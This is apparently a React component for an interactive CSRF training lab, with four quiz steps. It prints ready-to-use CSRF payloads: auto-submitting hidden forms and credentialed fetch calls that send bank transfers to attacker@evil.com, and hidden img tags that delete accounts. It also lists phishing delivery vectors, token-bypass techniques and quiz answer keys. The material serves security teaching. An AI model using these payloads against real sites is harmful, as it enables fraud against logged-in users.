import { useState } from "react";
import "./styles.scss";

export default function CSRFScanningTask({ onComplete }) {
  const [currentStep, setCurrentStep] = useState(0);
  const [completedSteps, setCompletedSteps] = useState([]);
  const [answers, setAnswers] = useState({});

  const steps = [
    {
      id: "craft-poc",
      title: "Craft Proof of Concept",
      description: "Create a simple CSRF attack PoC",
      task: (
        <div className="task-box">
          <h4>Building HTML PoC</h4>

          <div className="poc-example">
            <h5>Example 1: Simple auto-submit form</h5>
            <pre><code>{`<!DOCTYPE html>
<html>
<head>
  <title>You won a prize!</title>
</head>
<body>
  <h1>Congratulations! Click to claim!</h1>
  
  <!-- Hidden CSRF form -->
  <form action="https://bank.com/api/transfer" method="POST" id="csrfForm">
    <input type="hidden" name="to" value="attacker@evil.com"/>
    <input type="hidden" name="amount" value="10000"/>
  </form>

  <script>
    // Automatic form submission
    document.getElementById('csrfForm').submit();
  </script>
</body>
</html>`}</code></pre>
          </div>

          <div className="poc-example">
            <h5>Example 2: Fetch API in JavaScript</h5>
            <pre><code>{`<!-- Phishing page with attractive graphics -->
<img src="prize.png" alt="Prize"/>
<h2>Collect points!</h2>

<script>
  // CSRF via fetch
  fetch('https://bank.com/api/transfer', {
    method: 'POST',
    credentials: 'include', // Sends cookies!
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: 'to=attacker@evil.com&amount=5000'
  })
  .then(() => console.log('Transfer completed!'))
  .catch(() => console.log('Error'));
</script>`}</code></pre>
          </div>

          <div className="poc-example">
            <h5>Example 3: IMG tag trick</h5>
            <pre><code>{`<!-- GET-based CSRF (if endpoint uses GET) -->
<img src="https://bank.com/api/delete-account?confirm=yes" 
     style="display:none"/>

<!-- Can be in HTML email! -->
<img src="https://social.com/api/friend/add?user=attacker" 
     width="0" height="0"/>`}</code></pre>
          </div>

          <div className="info-box">
            <h5>PoC Delivery Vectors:</h5>
            <ul>
              <li><strong>Phishing email</strong> - HTML email with hidden form</li>
              <li><strong>Malicious website</strong> - Hosting on own server</li>
              <li><strong>Forum/comments</strong> - HTML injection (if allowed)</li>
              <li><strong>Social media</strong> - Link with SEO optimization</li>
              <li><strong>Online games</strong> - Iframe in browser game</li>
            </ul>
          </div>

          <div className="warning-box">
            <h5>Important Notes:</h5>
            <p>
              <strong>NEVER test on production without permission!</strong><br/>
              Use only your own test accounts<br/>
              Document all findings before remediation
            </p>
          </div>
        </div>
      ),
      question: "What is crucial in a CSRF attack PoC?",
      options: [
        "Colorful website",
        "Form/request that performs action in the context of logged-in victim",
        "Backdoor in application",
        "SQL Injection payload",
      ],
      correct: 1,
      explanation:
        "A CSRF PoC must contain a form or request that executes a state-changing action using the victim's authenticated session cookies.",
    },
    {
      id: "test-without-token",
      title: "Test Without CSRF Token",
      description: "Test requests without CSRF token",
      task: (
        <div className="task-box">
          <h4>Testing without CSRF token</h4>

          <div className="test-scenario">
            <h5>Test Scenario:</h5>
            <div className="steps">
              <div className="test-step">
                <span className="step-num">1</span>
                <div className="step-details">
                  <strong>Intercept original request</strong>
                  <p>Use Burp Suite to intercept legitimate request</p>
                  <code>POST /api/change-email HTTP/1.1</code>
                </div>
              </div>

              <div className="test-step">
                <span className="step-num">2</span>
                <div className="step-details">
                  <strong>Save request parameters</strong>
                  <p>Note all parameters and headers</p>
                  <code>email=new@email.com&csrf_token=abc123</code>
                </div>
              </div>

              <div className="test-step">
                <span className="step-num">3</span>
                <div className="step-details">
                  <strong>Remove CSRF token</strong>
                  <p>Send request WITHOUT csrf_token parameter</p>
                  <code>email=new@email.com</code>
                </div>
              </div>

              <div className="test-step">
                <span className="step-num">4</span>
                <div className="step-details">
                  <strong>Check server response</strong>
                  <div className="response-examples">
                    <div className="response vulnerable">
                      <strong>VULNERABLE:</strong>
                      <code>HTTP/1.1 200 OK</code>
                      <p>Email was changed!</p>
                    </div>
                    <div className="response secure">
                      <strong>PROTECTED:</strong>
                      <code>HTTP/1.1 403 Forbidden</code>
                      <p>Invalid CSRF token</p>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>

          <div className="burp-guide">
            <h5>Burp Suite - Quick tests:</h5>
            <div className="burp-steps">
              <div className="burp-step">
                <strong>Repeater Tab</strong>
                <p>Send to Repeater (Ctrl+R)</p>
                <ol>
                  <li>Find csrf_token parameter</li>
                  <li>Delete entire line</li>
                  <li>Click "Send"</li>
                  <li>Check status code</li>
                </ol>
              </div>

              <div className="burp-step">
                <strong>Intruder Tab</strong>
                <p>Automatic testing</p>
                <ol>
                  <li>Select token value</li>
                  <li>Add § markers</li>
                  <li>Payload: Empty string</li>
                  <li>Start attack</li>
                </ol>
              </div>
            </div>
          </div>

          <div className="success-criteria">
            <h5>Attack Success Criteria:</h5>
            <table>
              <thead>
                <tr>
                  <th>Status Code</th>
                  <th>Meaning</th>
                  <th>Vulnerability</th>
                </tr>
              </thead>
              <tbody>
                <tr className="vulnerable-row">
                  <td><code>200 OK</code></td>
                  <td>Action completed successfully</td>
                  <td><span className="badge danger">VULNERABLE</span></td>
                </tr>
                <tr className="vulnerable-row">
                  <td><code>302 Redirect</code></td>
                  <td>Redirect after action</td>
                  <td><span className="badge danger">VULNERABLE</span></td>
                </tr>
                <tr className="secure-row">
                  <td><code>403 Forbidden</code></td>
                  <td>CSRF token required</td>
                  <td><span className="badge success">SECURE</span></td>
                </tr>
                <tr className="secure-row">
                  <td><code>400 Bad Request</code></td>
                  <td>Missing required parameter</td>
                  <td><span className="badge success">SECURE</span></td>
                </tr>
              </tbody>
            </table>
          </div>
        </div>
      ),
      question: "What does 200 OK response mean after removing CSRF token?",
      options: [
        "Application is secure",
        "Application is VULNERABLE to CSRF - action executed without token validation",
        "Token is not needed",
        "This is normal behavior",
      ],
      correct: 1,
      explanation:
        "A 200 OK response after removing the CSRF token indicates the application doesn't properly validate CSRF tokens, making it vulnerable to CSRF attacks.",
    },
    {
      id: "test-token-reuse",
      title: "Test Token Reuse",
      description: "Test token reuse scenarios",
      task: (
        <div className="task-box">
          <h4>Testing Token Reuse</h4>

          <div className="reuse-test">
            <h5>Scenario: Is the token single-use?</h5>
            
            <div className="test-sequence">
              <div className="sequence-step">
                <span className="step-badge">STEP 1</span>
                <div className="step-content">
                  <h6>Perform action with token</h6>
                  <pre><code>{`POST /api/transfer HTTP/1.1
Cookie: session=xyz789
Content-Type: application/x-www-form-urlencoded

to=user1@example.com&amount=100&csrf_token=TOKEN_ABC123`}</code></pre>
                  <div className="result success">
                    <p><strong>Response:</strong> 200 OK - Transfer completed</p>
                  </div>
                </div>
              </div>

              <div className="sequence-step">
                <span className="step-badge">STEP 2</span>
                <div className="step-content">
                  <h6>Use SAME token again</h6>
                  <pre><code>{`POST /api/transfer HTTP/1.1
Cookie: session=xyz789
Content-Type: application/x-www-form-urlencoded

to=attacker@evil.com&amount=5000&csrf_token=TOKEN_ABC123`}</code></pre>
                  <div className="result-options">
                    <div className="result-option vulnerable">
                      <strong>VULNERABLE:</strong>
                      <code>200 OK</code>
                      <p>Token works multiple times!</p>
                    </div>
                    <div className="result-option secure">
                      <strong>SECURE:</strong>
                      <code>403 Forbidden</code>
                      <p>Token already used / expired</p>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>

          <div className="attack-scenario">
            <h5>Attack scenario with token reuse:</h5>
            <ol className="attack-steps">
              <li>
                <strong>Victim performs legitimate action</strong>
                <p>On phishing page that looks authentic</p>
              </li>
              <li>
                <strong>Attacker intercepts token</strong>
                <p>Via XSS, man-in-the-middle, or network sniffing</p>
              </li>
              <li>
                <strong>Attacker reuses token multiple times</strong>
                <p>Performs multiple malicious actions with one token</p>
              </li>
              <li>
                <strong>Profit for attacker</strong>
                <p>All actions execute on behalf of victim</p>
              </li>
            </ol>
          </div>

          <div className="best-practices">
            <h5>Proper Token Implementation:</h5>
            <div className="practices-grid">
              <div className="practice">
                <strong>Single-use</strong>
                <p>Token invalid after use</p>
              </div>
              <div className="practice">
                <strong>Expiring</strong>
                <p>TTL 15-30 minutes</p>
              </div>
              <div className="practice">
                <strong>Unpredictable</strong>
                <p>Cryptographically random</p>
              </div>
              <div className="practice">
                <strong>Per-session</strong>
                <p>Tied to session</p>
              </div>
              <div className="practice">
                <strong>Per-request</strong>
                <p>Different for each action</p>
              </div>
              <div className="practice">
                <strong>Server-side</strong>
                <p>Server-side validation</p>
              </div>
            </div>
          </div>

          <div className="warning-box">
            <h5>Red Flags (bad practices):</h5>
            <ul>
              <li>Same token for all users</li>
              <li>Token visible in URL</li>
              <li>Static token (e.g. "csrf_token")</li>
              <li>Token validated only client-side (JavaScript)</li>
              <li>No token expiration</li>
            </ul>
          </div>
        </div>
      ),
      question: "Why is token reuse dangerous?",
      options: [
        "It's not dangerous",
        "Attacker can use intercepted token to perform multiple malicious actions",
        "It increases application performance",
        "It makes debugging easier",
      ],
      correct: 1,
      explanation:
        "Token reuse allows attackers to perform multiple unauthorized actions using a single intercepted or leaked token, significantly increasing the attack impact.",
    },
    {
      id: "bypass-techniques",
      title: "Bypass Techniques",
      description: "CSRF protection bypass techniques",
      task: (
        <div className="task-box">
          <h4>CSRF Protection Bypass Techniques</h4>

          <div className="bypass-technique">
            <div className="technique-header">
              <span className="technique-icon">1</span>
              <h5>Null Token Bypass</h5>
            </div>
            <div className="technique-content">
              <p className="description">
                Some applications accept empty/null tokens
              </p>
              <div className="example-grid">
                <div className="example">
                  <span className="label">Remove parameter:</span>
                  <code>to=attacker@evil.com&amount=100</code>
                </div>
                <div className="example">
                  <span className="label">Empty value:</span>
                  <code>csrf_token=&to=attacker@evil.com</code>
                </div>
                <div className="example">
                  <span className="label">Null:</span>
                  <code>csrf_token=null&to=attacker@evil.com</code>
                </div>
              </div>
            </div>
          </div>

          <div className="bypass-technique">
            <div className="technique-header">
              <span className="technique-icon">2</span>
              <h5>Method Change Bypass</h5>
            </div>
            <div className="technique-content">
              <p className="description">
                Changing HTTP method may bypass validation
              </p>
              <pre><code>{`// Original request (protected)
POST /api/change-email
csrf_token=abc123&email=new@email.com

// Try GET (might not be protected)
GET /api/change-email?email=attacker@evil.com

// Try PUT
PUT /api/change-email
email=attacker@evil.com`}</code></pre>
            </div>
          </div>

          <div className="bypass-technique">
            <div className="technique-header">
              <span className="technique-icon">3</span>
              <h5>Token from Another Session</h5>
            </div>
            <div className="technique-content">
              <p className="description">
                Use token from your own session in PoC for victim
              </p>
              <div className="session-attack">
                <div className="attacker-side">
                  <h6>Attacker account:</h6>
                  <code>csrf_token=ATTACKER_TOKEN_XYZ</code>
                </div>
                <div className="arrow">→</div>
                <div className="victim-side">
                  <h6>In PoC for victim:</h6>
                  <pre><code>{`<form action="https://bank.com/transfer">
  <input name="csrf_token" 
         value="ATTACKER_TOKEN_XYZ"/>
  <input name="to" value="attacker"/>
  <input name="amount" value="10000"/>
</form>`}</code></pre>
                </div>
              </div>
              <div className="note warning">
                Works if token is NOT tied to session!
              </div>
            </div>
          </div>

          <div className="bypass-technique">
            <div className="technique-header">
              <span className="technique-icon">4</span>
              <h5>Referer/Origin Header Manipulation</h5>
            </div>
            <div className="technique-content">
              <p className="description">
                Manipulating source headers
              </p>
              <div className="header-tests">
                <div className="header-test">
                  <strong>Remove Referer:</strong>
                  <code>&lt;meta name="referrer" content="never"/&gt;</code>
                </div>
                <div className="header-test">
                  <strong>Subdomain bypass:</strong>
                  <code>Referer: https://evil.bank.com</code>
                  <p className="note">If validation only checks "bank.com"</p>
                </div>
                <div className="header-test">
                  <strong>Email HTML:</strong>
                  <code>Referer: about:blank</code>
                  <p className="note">Opened from email client</p>
                </div>
              </div>
            </div>
          </div>

          <div className="bypass-technique">
            <div className="technique-header">
              <span className="technique-icon">5</span>
              <h5>Content-Type Manipulation</h5>
            </div>
            <div className="technique-content">
              <p className="description">
                Changing Content-Type may bypass CORS preflight
              </p>
              <pre><code>{`// Requires preflight (protected)
Content-Type: application/json

// No preflight (may work)
Content-Type: text/plain
Content-Type: application/x-www-form-urlencoded
Content-Type: multipart/form-data`}</code></pre>
            </div>
          </div>

          <div className="testing-checklist">
            <h5>Bypass Testing Checklist:</h5>
            <ul className="checklist">
              <li>
                <input type="checkbox" disabled />
                <span>Remove token completely</span>
              </li>
              <li>
                <input type="checkbox" disabled />
                <span>Empty token value</span>
              </li>
              <li>
                <input type="checkbox" disabled />
                <span>Token = null or 0</span>
              </li>
              <li>
                <input type="checkbox" disabled />
                <span>Change method (POST → GET/PUT)</span>
              </li>
              <li>
                <input type="checkbox" disabled />
                <span>Token from another session</span>
              </li>
              <li>
                <input type="checkbox" disabled />
                <span>Old/expired token</span>
              </li>
              <li>
                <input type="checkbox" disabled />
                <span>Remove Referer header</span>
              </li>
              <li>
                <input type="checkbox" disabled />
                <span>Manipulate Origin</span>
              </li>
              <li>
                <input type="checkbox" disabled />
                <span>Change Content-Type</span>
              </li>
              <li>
                <input type="checkbox" disabled />
                <span>Array parameter trick: csrf_token[]=abc</span>
              </li>
            </ul>
          </div>
        </div>
      ),
      question: "Which technique can bypass weak CSRF protection?",
      options: [
        "Using HTTPS",
        "Using CSRF token from attacker's own session, if tokens are NOT tied to sessions",
        "Strong password",
        "Two-factor authentication (2FA)",
      ],
      correct: 1,
      explanation:
        "If CSRF tokens are not properly tied to user sessions, an attacker can use their own valid token in a CSRF attack against other users, bypassing the protection.",
    },
  ];

  const handleAnswer = (stepIndex, selectedOption) => {
    const step = steps[stepIndex];
    const isCorrect = selectedOption === step.correct;

    setAnswers((prev) => ({
      ...prev,
      [stepIndex]: {
        selected: selectedOption,
        correct: isCorrect,
      },
    }));

    if (isCorrect && !completedSteps.includes(stepIndex)) {
      const newCompleted = [...completedSteps, stepIndex];
      setCompletedSteps(newCompleted);

      if (newCompleted.length === steps.length) {
        onComplete?.("scanning");
      }
    }
  };

  const goNext = () => {
    if (currentStep < steps.length - 1) {
      setCurrentStep(currentStep + 1);
    }
  };

  const goPrev = () => {
    if (currentStep > 0) {
      setCurrentStep(currentStep - 1);
    }
  };

  const handleRestart = () => {
    setCurrentStep(0);
    setCompletedSteps([]);
    setAnswers({});
    window.scrollTo({ top: 0, behavior: "smooth" });
  };

  const step = steps[currentStep];
  const answered = answers[currentStep];

  return (
    <div className="scanning-container">
      <div className="content-section">
        <h2 className="step-title">{step.title}</h2>
        <p className="step-description">{step.description}</p>

        {step.task}

        <div className="question-container">
          <h4 className="question-title">{step.question}</h4>

          <div className="options-container">
            {step.options.map((option, idx) => {
              const isSelected = answered?.selected === idx;
              const isCorrect = idx === step.correct;
              const showResult = answered && isSelected;

              return (
                <button
                  key={idx}
                  onClick={() => handleAnswer(currentStep, idx)}
                  disabled={answered !== undefined}
                  className={`option-button ${
                    showResult
                      ? isCorrect
                        ? "correct"
                        : "incorrect"
                      : isSelected
                      ? "selected"
                      : ""
                  }`}
                >
                  <span className="option-icon">
                    {showResult ? (isCorrect ? "✓" : "✗") : "○"}
                  </span>
                  {option}
                </button>
              );
            })}
          </div>

          {answered && (
            <div
              className={`feedback-box ${
                answered.correct ? "correct" : "incorrect"
              }`}
            >
              <p className="feedback-title">
                {answered.correct ? "Correct!" : "Incorrect"}
              </p>
              <p className="feedback-explanation">{step.explanation}</p>
              {!answered.correct && (
                <div className="restart-prompt">
                  <p className="restart-text">
                    Don't worry! Learning from mistakes is part of the process.
                    You can restart this phase to try again.
                  </p>
                  <button
                    onClick={handleRestart}
                    className="restart-button"
                  >
                    Restart Phase
                  </button>
                </div>
              )}
            </div>
          )}
        </div>
      </div>

      <div className="navigation-buttons">
        <button
          onClick={goPrev}
          disabled={currentStep === 0}
          className="nav-button prev-button"
        >
          Previous
        </button>

        {completedSteps.includes(currentStep) &&
          currentStep < steps.length - 1 && (
            <button onClick={goNext} className="nav-button next-button">
              Next
            </button>
          )}

        {completedSteps.length === steps.length && (
          <button className="nav-button complete-button">
            Phase completed!
          </button>
        )}
      </div>
    </div>
  );
}
